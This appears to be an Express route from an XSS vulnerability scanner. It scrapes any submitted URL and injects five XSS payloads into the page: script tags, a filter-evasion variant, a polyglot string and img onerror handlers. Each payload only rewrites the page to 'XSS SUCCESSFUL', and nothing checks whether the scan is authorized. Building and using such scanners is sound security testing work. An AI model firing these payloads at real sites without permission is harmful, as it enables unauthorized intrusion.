const express = require('express');
const webScraping = require('../attackJS/webScraping');
const xss = require('../attackJS/xss');
const p = require('../attackJS/params');

var router = express.Router();
require('events').EventEmitter.defaultMaxListeners = 20;

router.post('/', async function(req, res, next) {
  url = req.body.url;
  xssTest(res, url);
});

module.exports = router;

// perform xss attack, testing all the scripts
async function xssTest(res, url){
  // create obj params
  var params = new p.Params(url);

  // scraping the web page the find all the data we need to perform the attack
  var data = await webScraping.getInfo(url);

  // if page is reached perform the attack
  if (data.comment != "Page not reached"){
    // set the params
    await p.setAfterScraping(params, data);

    // injected code
    // document.body.innerHTML=\"<p>XSS SUCCESSFUL</p>\"
    const scripts = [
      "<script>document.body.innerHTML='<p>XSS SUCCESSFUL</p>'</script>",
      "<<a>script>document.body.innerHTML='<p>XSS SUCCESSFUL</p>'</<a>script>",
      "';document.body.innerHTML='<p>XSS SUCCESSFUL</p>'//';document.body.innerHTML='<p>XSS SUCCESSFUL</p>'//\";document.body.innerHTML='<p>XSS SUCCESSFUL</p>'//\\\";document.body.innerHTML='<p>XSS SUCCESSFUL</p>'//--></SCRIPT>\">'><SCRIPT>document.body.innerHTML='<p>XSS SUCCESSFUL</p>'</SCRIPT>=&{}",
      "<img src=x onerror='document.body.innerHTML=\"<p>XSS SUCCESSFUL</p>\"'>",
      ">'>\"><img src=x onerror='document.body.innerHTML=\"<p>XSS SUCCESSFUL</p>\"'>"
    ];

    // check if attack is possible
    if (p.canXSS(params)){
      // attack with each script
      for(var i=0; i<scripts.length; i++){
        await xss.xssAttack(params, scripts[i], i).catch((err) =>{
          process.stdout.write("----------|FINISHED\n");
        });
      }
      // set params secure attribute
      p.isSecure(params);
    }
  }else{
    // set params comment attribute
    params.comment = data.comment;
  }
  console.log(params);
  console.log(params.input);

  // send data back to the web page
  res.json(params);
  res.end();
}